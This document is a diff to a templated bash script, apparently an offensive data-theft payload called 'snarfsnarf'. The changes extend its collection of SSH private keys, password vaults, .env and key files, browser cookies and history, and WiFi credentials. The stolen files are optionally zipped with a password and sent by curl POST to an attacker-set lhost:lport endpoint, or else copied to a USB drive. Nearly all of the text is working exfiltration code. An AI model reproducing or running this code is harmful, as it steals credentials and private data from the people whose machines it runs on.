@@ -28,12 +28,24 @@ add_files "$HOME_DIR/Downloads" .docx .pdf .xlsx .txt .csv
 {% endif %}
 
 {% if targets.sensitive %}
-add_files "$HOME_DIR" .kdbx .pem .key .env .config
+add_files "$HOME_DIR" .kdbx .pem .key .env .config .conf .cfg
+add_files "$HOME_DIR/.config" .conf .cfg .json .ini
+if [ -d "$HOME_DIR/.ssh" ]; then
+    while IFS= read -r f; do COLLECTED+=("$f"); done < <(
+        find "$HOME_DIR/.ssh" -maxdepth 1 -type f 2>/dev/null
+    )
+fi
 {% endif %}
 
 {% if targets.credentials %}
 if [ -d "$HOME_DIR/.ssh" ]; then
-    while IFS= read -r f; do COLLECTED+=("$f"); done < <(find "$HOME_DIR/.ssh" -type f 2>/dev/null)
+    for keyname in id_rsa id_ed25519 id_ecdsa id_dsa authorized_keys known_hosts config; do
+        f="$HOME_DIR/.ssh/$keyname"
+        [ -f "$f" ] && COLLECTED+=("$f")
+    done
+    while IFS= read -r f; do COLLECTED+=("$f"); done < <(
+        find "$HOME_DIR/.ssh" -maxdepth 1 -type f 2>/dev/null
+    )
 fi
 # WiFi (Linux NetworkManager)
 if command -v nmcli >/dev/null 2>&1; then
@@ -47,15 +59,23 @@ fi
 for p in \
     "$HOME_DIR/.config/google-chrome/Default/History" \
     "$HOME_DIR/.config/google-chrome/Default/Bookmarks" \
-    "$HOME_DIR/.mozilla/firefox" \
-    "$HOME_DIR/Library/Application Support/Google/Chrome/Default/History"; do
-    [ -e "$p" ] && COLLECTED+=("$p")
+    "$HOME_DIR/.config/google-chrome/Default/Cookies" \
+    "$HOME_DIR/.config/chromium/Default/History" \
+    "$HOME_DIR/snap/chromium/common/.config/chromium/Default/History" \
+    "$HOME_DIR/Library/Application Support/Google/Chrome/Default/History" \
+    "$HOME_DIR/Library/Application Support/Google/Chrome/Default/Bookmarks"; do
+    [ -f "$p" ] && COLLECTED+=("$p")
 done
+if [ -d "$HOME_DIR/.mozilla/firefox" ]; then
+    while IFS= read -r f; do COLLECTED+=("$f"); done < <(
+        find "$HOME_DIR/.mozilla/firefox" -type f \( -name 'places.sqlite' -o -name 'cookies.sqlite' -o -name 'formhistory.sqlite' \) 2>/dev/null | head -n 10
+    )
+fi
 {% endif %}
 
 {% if targets.recent %}
-# Recent docs — Linux recent files
-add_files "$HOME_DIR/.local/share/recently-used.xbel" .
+RECENT_XBEL="$HOME_DIR/.local/share/recently-used.xbel"
+[ -f "$RECENT_XBEL" ] && COLLECTED+=("$RECENT_XBEL")
 {% endif %}
 
 {% if targets.clipboard %}
@@ -75,12 +95,64 @@ while IFS= read -r f; do COLLECTED+=("$f"); done < <(find "$HOME_DIR" -name "{{ 
 {% raw %}
 count=${#COLLECTED[@]}
 [ "$count" -eq 0 ] && exit 0
+
+# De-dupe paths and skip missing/unreadable before upload
+UNIQUE=()
+declare -A _seen=()
+for f in "${COLLECTED[@]}"; do
+    [ -f "$f" ] || continue
+    if [ ! -r "$f" ]; then
+        staged="/tmp/snarf_stage_${SNARF_STAMP}_$(basename "$f")"
+        cp "$f" "$staged" 2>/dev/null || continue
+        f="$staged"
+    fi
+    [ -s "$f" ] || continue
+    [ -n "${_seen[$f]+x}" ] && continue
+    _seen[$f]=1
+    UNIQUE+=("$f")
+done
+[ "${#UNIQUE[@]}" -eq 0 ] && exit 0
 {% endraw %}
 
 {% if output_mode == 'phone_home' %}
 URI="http://{{ lhost }}:{{ lport }}/api/snarf{% if catch_token %}?ct={{ catch_token }}{% endif %}"
-for f in "${COLLECTED[@]}"; do
-    [ -f "$f" ] || continue
+{% if zip %}
+if command -v zip >/dev/null 2>&1; then
+    ZIP_TMP="/tmp/snarf_${SNARF_HOST}_${SNARF_STAMP}.zip"
+    {% if zip_password %}
+    zip -P "{{ zip_password }}" -j "$ZIP_TMP" "${UNIQUE[@]}" 2>/dev/null
+    {% else %}
+    zip -j "$ZIP_TMP" "${UNIQUE[@]}" 2>/dev/null
+    {% endif %}
+    if [ -f "$ZIP_TMP" ] && [ -s "$ZIP_TMP" ]; then
+        curl -s -X POST "$URI" \
+            -F "hostname=$SNARF_HOST" \
+            -F "source=snarfsnarf" \
+            -F "timestamp=$SNARF_STAMP" \
+            -F "filepath=$ZIP_TMP" \
+            -F "file=@$ZIP_TMP" 2>/dev/null || true
+    else
+        for f in "${UNIQUE[@]}"; do
+            curl -s -X POST "$URI" \
+                -F "hostname=$SNARF_HOST" \
+                -F "source=snarfsnarf" \
+                -F "timestamp=$SNARF_STAMP" \
+                -F "filepath=$f" \
+                -F "file=@$f" 2>/dev/null || true
+        done
+    fi
+else
+    for f in "${UNIQUE[@]}"; do
+        curl -s -X POST "$URI" \
+            -F "hostname=$SNARF_HOST" \
+            -F "source=snarfsnarf" \
+            -F "timestamp=$SNARF_STAMP" \
+            -F "filepath=$f" \
+            -F "file=@$f" 2>/dev/null || true
+    done
+fi
+{% else %}
+for f in "${UNIQUE[@]}"; do
     curl -s -X POST "$URI" \
         -F "hostname=$SNARF_HOST" \
         -F "source=snarfsnarf" \
@@ -88,6 +160,7 @@ for f in "${COLLECTED[@]}"; do
         -F "filepath=$f" \
         -F "file=@$f" 2>/dev/null || true
 done
+{% endif %}
 {% else %}
 # USB mount (Linux)
 USB_MOUNT=""
@@ -104,8 +177,7 @@ DEST_ROOT="$USB_MOUNT"
 DEST_DIR="$DEST_ROOT/snarf_${SNARF_HOST}_${SNARF_STAMP}"
 mkdir -p "$DEST_DIR"
 
-for f in "${COLLECTED[@]}"; do
-    [ -f "$f" ] || continue
+for f in "${UNIQUE[@]}"; do
     safe=$(echo "$f" | tr '/:' '_')
     cp -f "$f" "$DEST_DIR/$safe" 2>/dev/null || true
 done
